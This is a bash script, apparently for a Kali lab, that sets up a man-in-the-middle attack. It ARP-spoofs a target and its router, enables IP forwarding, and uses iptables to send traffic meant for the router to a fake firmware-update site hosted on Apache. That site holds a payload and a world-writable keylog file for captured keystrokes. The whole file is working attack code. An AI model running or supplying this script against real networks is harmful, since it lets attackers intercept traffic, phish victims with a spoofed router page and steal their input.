#!/bin/bash

# ------- CONFIGURATION ---------
KALI_IP="" # Local IP
TARGET_IP="" # LocaL IP
ROUTER_IP="" # Default Gateway
INTERFACE="" # use correct labing depending on wireless or wired
FAKE_SITE_DIR=""  # Path where your fake index.html and payload live
# --------------------------------

echo "[+] Starting MITM redirection..."

# Enable IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Deploy fake firmware update site
echo "[+] Deploying fake firmware update site to Apache..."
sudo rm -rf /var/www/html/*
sudo cp -r "$FAKE_SITE_DIR"/* /var/www/html/

#Allow everyone write permissions for keylog.txt
sudo chmod 666 /var/www/html/keylog.txt

# Start Apache if not running
echo "[+] Ensuring Apache is running..."
sudo systemctl start apache2

# Start ARP spoofing
echo "[+] Launching ARP spoofing..."
xterm -e "arpspoof -i $INTERFACE -t $TARGET_IP -r $ROUTER_IP" &

# Redirect HTTP & HTTPS
echo "[+] Redirecting all traffic meant for $ROUTER_IP to Kali's fake server..."
sudo iptables -t nat -A PREROUTING -p tcp -d $ROUTER_IP --dport 80 -j DNAT --to-destination $KALI_IP
sudo iptables -t nat -A PREROUTING -p tcp -d $ROUTER_IP --dport 443 -j DNAT --to-destination $KALI_IP

echo "[✓] Fake firmware update page will appear as http://$ROUTER_IP on target machine."
echo "[✓] MITM setup complete... Waiting for target $TARGET_IP to access the router..."
